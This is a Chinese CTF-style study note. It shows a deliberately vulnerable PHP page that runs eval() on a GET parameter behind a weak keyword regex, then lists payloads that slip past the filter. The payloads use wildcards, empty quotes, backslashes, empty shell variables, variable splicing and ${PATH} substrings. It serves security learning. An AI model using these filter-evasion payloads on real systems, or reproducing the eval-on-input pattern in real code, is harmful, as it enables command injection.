---
title: 命令执行 | 文件名过滤绕过
date: 2026-04-17 21:00:00 +0800
categories: [笔记]
tags: [命令执行, 绕过文件名过滤]
---

## 题目源码
---

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);

if (isset($_GET['cmd'])){
	$cmd = $_GET['cmd'];
	if (!preg_match("/flag|system|php/i", $cmd)){
		eval($cmd);
	} else {
		echo "命令有问题，来黑我丫!!!";
	}
}
```



## 绕过手法
---

### 通配符`?`、`*`绕过

模糊搜索文件/匹配字符。
- `?`：仅代表**单个字符**
- `*`：代表**任意长度任意字符**

`cat fl?g.txt`
`cat ????.???`
`cat f*`


### 单引号、双引号绕过

`''`、`""` 为空字符，不影响命令执行

注意单/双引号选择，取决于命令最外层的闭合符


`passthru('cat fl""ag.p""hp');`
`passthru('cat fl\'\'ag.p\'\'hp');`


### 反斜线绕过

反斜线 `\` 本意是取消特殊字符的功能，使其仅作为普通字符串使用

在这里的用法跟单双引号类似

`cat f\lag.p\hp`


### 特殊变量绕过

Linux 特殊变量 `$1`~`$9`、`$@`、`$*` 输出内容为空

`cat fl$1ag.p$9hp`
`cat fl$@ag.p$*hp`

### 内联执行绕过

通过自定义变量拆分字符串，再拼接执行，绕过关键词完整匹配。


`a=fl;d=ag;c=p;h=h;cat $a$d.$c$h$c`

### 利用Linux中的环境变量绕过

从系统环境变量`${PATH}`中截取指定字符，拼接成目标关键词，实现无明文绕过。

`cat f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}`
